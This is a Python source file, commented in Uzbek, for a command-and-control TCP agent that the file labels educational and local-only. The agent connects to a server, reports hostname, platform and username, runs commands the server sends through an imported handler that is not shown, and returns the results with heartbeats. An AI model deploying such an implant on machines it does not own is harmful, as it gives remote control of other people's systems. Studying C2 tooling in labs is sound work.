"""
C2 Platform TCP Agent
TCP socket orqali serverga ulanadigan agent
"""

import socket
import json
import time
import threading
import sys
import os
from datetime import datetime

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
try:
    from common.config import *
    from common.utils import *
    from common.commands import CommandHandler
    from common.crypto import generate_agent_id
except ImportError as e:
    print(f"Import xatosi: {e}")
    # Fallback values
    SERVER_HOST = "127.0.0.1"


class TCPAgent:
    """TCP C2 Agent klassi"""
    
    def __init__(self, server_host='127.0.0.1', server_port=9999):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.agent_id = self._get_agent_id()
        self.command_handler = CommandHandler()
        self.system_info = self._get_system_info()
        
    def _get_agent_id(self):
        """Agent ID olish"""
        try:
            return generate_agent_id()
        except:
            import uuid
            return str(uuid.uuid4())
    
    def _get_system_info(self):
        """System ma'lumotlari"""
        try:
            return get_system_info()
        except:
            import platform
            import socket as sock
            return {
                "agent_id": self.agent_id,
                "hostname": sock.gethostname(),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "username": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
                "timestamp": datetime.now().isoformat()
            }
    
    def connect(self):
        """Serverga ulanish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            
            # Ro'yxatdan o'tish
            self.send_data(json.dumps(self.system_info))
            self.log(f"✅ Serverga ulandi: {self.server_host}:{self.server_port}")
            return True
            
        except Exception as e:
            self.log(f"❌ Ulanish xatosi: {e}")
            return False
    
    def send_data(self, data):
        """Ma'lumot yuborish"""
        try:
            message = data.encode('utf-8')
            message_length = len(message)
            
            # Uzunlikni yuborish (4 byte)
            self.socket.sendall(message_length.to_bytes(4, byteorder='big'))
            # Ma'lumotni yuborish
            self.socket.sendall(message)
            
        except Exception as e:
            raise ConnectionError(f"Send xatosi: {e}")
    
    def receive_data(self, timeout=30):
        """Ma'lumot olish"""
        try:
            self.socket.settimeout(timeout)
            
            # Uzunlikni olish (4 byte)
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            
            message_length = int.from_bytes(length_data, byteorder='big')
            
            # Ma'lumotni olish
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    break
                message += chunk
            
            return message.decode('utf-8')
            
        except socket.timeout:
            return None
        except Exception as e:
            raise ConnectionError(f"Receive xatosi: {e}")
    
    def handle_command(self, command):
        """Komandani bajarish"""
        try:
            cmd_type = command.get('type', '')
            cmd_id = command.get('id', 'unknown')
            
            # Disconnect signal tekshirish
            if cmd_type == 'disconnect':
                reason = command.get('reason', 'Server disconnected')
                self.log(f"🚫 Server tomonidan uzildi: {reason}")
                self.running = False
                return None
            
            self.log(f"🎯 Komanda: {cmd_type} (ID: {cmd_id})")
            
            if cmd_type == 'heartbeat':
                # Heartbeat javob
                response = {
                    'type': 'heartbeat',
                    'agent_id': self.agent_id,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                # Boshqa komandalar
                result = self.command_handler.handle_command(command)
                response = {
                    'type': 'command_result',
                    'agent_id': self.agent_id,
                    'command_id': cmd_id,
                    'data': result,
                    'timestamp': datetime.now().isoformat()
                }
            
            return response
            
        except Exception as e:
            return {
                'type': 'error',
                'agent_id': self.agent_id,
                'message': f'Komanda xatosi: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }
    
    def start(self):
        """Agent ishga tushirish"""
        self.log("🚀 TCP Agent ishga tushmoqda...")
        
        # Serverga ulanish
        if not self.connect():
            self.log("❌ Serverga ulanib bo'lmadi!")
            return
        
        self.running = True
        
        try:
            while self.running:
                # Server dan komanda kutish
                data = self.receive_data(timeout=15)
                
                if data:
                    try:
                        command = json.loads(data)
                        response = self.handle_command(command)
                        
                        # Javob yuborish
                        self.send_data(json.dumps(response))
                        
                    except json.JSONDecodeError:
                        self.log("⚠️ Noto'g'ri JSON olindi")
                    except Exception as e:
                        self.log(f"❌ Komanda handle xatosi: {e}")
                else:
                    # Timeout - heartbeat yuborish
                    heartbeat = {
                        'type': 'heartbeat',
                        'agent_id': self.agent_id,
                        'timestamp': datetime.now().isoformat()
                    }
                    try:
                        self.send_data(json.dumps(heartbeat))
                    except:
                        self.log("❌ Heartbeat yuborib bo'lmadi")
                        break
        
        except KeyboardInterrupt:
            self.log("🛑 Agent to'xtatildi")
        except ConnectionError as e:
            self.log(f"❌ Aloqa uzildi: {e}")
        except Exception as e:
            self.log(f"❌ Agent xatosi: {e}")
        finally:
            self.cleanup()
    
    def stop(self):
        """Agent to'xtatish"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.log("🛑 TCP Agent to'xtatildi")
    
    def cleanup(self):
        """Tozalash"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
    
    def log(self, message):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [TCP-AGENT:{self.agent_id[:8]}] {message}")


def main():
    """Asosiy funksiya"""
    print("=" * 50)
    print("🎯 C2 TCP Agent - Ta'lim maqsadida")
    print("⚠️  Faqat o'z kompyuteringizda sinash uchun!")
    print("=" * 50)
    
    # Server parametrlarini so'rash
    try:
        host = input(f"Server host [{SERVER_HOST}]: ").strip() or SERVER_HOST
        port = input("Server port [9999]: ").strip() or "9999"
        port = int(port)
    except (ValueError, KeyboardInterrupt):
        print("❌ Noto'g'ri parametrlar")
        return
    
    # Agent yaratish va ishga tushirish
    agent = TCPAgent(host, port)
    
    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()
    except Exception as e:
        print(f"❌ Xato: {e}")


if __name__ == "__main__":
    main()